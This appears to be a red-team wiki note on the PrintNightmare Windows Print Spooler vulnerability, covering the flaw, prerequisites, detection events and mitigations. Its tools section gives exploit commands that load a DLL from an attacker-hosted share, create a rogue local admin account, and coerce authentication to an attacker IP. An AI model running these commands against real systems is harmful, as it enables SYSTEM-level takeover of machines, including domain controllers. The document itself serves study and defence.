---
title: PrintNightmare
aliases: ["CVE-2021-34527", "CVE-2021-1675", "Print Spooler RCE"]
type: technique
domain: [red-team, active-directory]
attack_tactic: [privesc, lateral-movement]
tags: [type/technique, domain/red-team, attack/privesc, cve]
source: "Multiple researchers"
source_url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"
verified: true
related: ["[[Domain Controller (DC)]]", "[[Remote Execution & Lateral Movement (Windows)]]", "[[Privileges and Rights]]", "[[PetitPotam]]"]
created: 2026-06-07
updated: 2026-06-07
---

# PrintNightmare (CVE-2021-34527 / CVE-2021-1675)

> [!summary] One-liner
> A critical vulnerability in the Windows Print Spooler service allowing authenticated users to execute arbitrary code as SYSTEM — either locally (LPE) or remotely (RCE) by loading a malicious DLL via `RpcAddPrinterDriverEx`.

## Concept abused
The **Print Spooler** service (`spoolsv.exe`, runs as SYSTEM) exposes RPC functions for managing printer drivers. `RpcAddPrinterDriverEx` allows adding a printer driver from a UNC path. Due to insufficient authorization checks, any authenticated user can call this function and load an attacker-controlled DLL — which executes as **SYSTEM**.

Two related CVEs:
- **CVE-2021-1675**: Initially rated as LPE only (June 2021 patch).
- **CVE-2021-34527**: The full RCE variant — the June patch was insufficient (July 2021 out-of-band patch).

## Prerequisites
- **Authenticated** domain user (any, no special privileges).
- Print Spooler service **running** on the target (enabled by default on all Windows systems, including DCs).
- For RCE: SMB access to the target + the attacker hosts a share with the malicious DLL.

## Commands & tools

### Impacket (RCE variant)
```bash
# Host malicious DLL on an SMB share (smbserver.py)
smbserver.py share /path/to/dll/ -smb2support

# Exploit
CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET> '\\<ATTACKER_IP>\share\evil.dll'
```

### PowerShell (LPE variant)
```powershell
# CVE-2021-1675.ps1 — local privilege escalation
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd!" -DriverName "PrinterDriver"
# Creates a new local admin account
```

### SharpPrintNightmare (C#)
```powershell
# LPE
SharpPrintNightmare.exe C:\path\to\evil.dll

# RCE
SharpPrintNightmare.exe '\\<ATTACKER_IP>\share\evil.dll' '\\<TARGET>\pipe\spoolss'
```

### SpoolSample / PrinterBug (coercion — separate concept)
```bash
# Force a machine to authenticate to the attacker (for NTLM relay)
SpoolSample.exe <TARGET> <ATTACKER_IP>
printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET> <ATTACKER_IP>
```

## Detection / artifacts
- **Event 808** (PrintService/Admin): Print driver installation events.
- New DLL loaded by `spoolsv.exe` from a UNC path or unusual directory.
- New user creation / privilege escalation immediately after driver load.
- Sysmon Event 7 (Image Loaded): DLLs loaded by `spoolsv.exe`.
- Outbound SMB from the target to an unexpected host (fetching the DLL).

## Mitigation
- **Patch**: KB5004945 (July 2021 out-of-band) and subsequent updates.
- **Disable the Print Spooler** on servers / DCs that don't need printing:
  ```powershell
  Stop-Service Spooler; Set-Service Spooler -StartupType Disabled
  ```
- GPO: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections: Disabled`
- Restrict driver installation: `RestrictDriverInstallationToAdministrators` = 1.

## Related
- Similar coercion: [[PetitPotam]] (EFS RPC coercion).
- Lateral movement context: [[Remote Execution & Lateral Movement (Windows)]].
- Commonly targets: [[Domain Controller (DC)]] (Spooler often left running on DCs).

## Sources
- CVE-2021-34527 / CVE-2021-1675.
- Microsoft Security Response Center advisory.
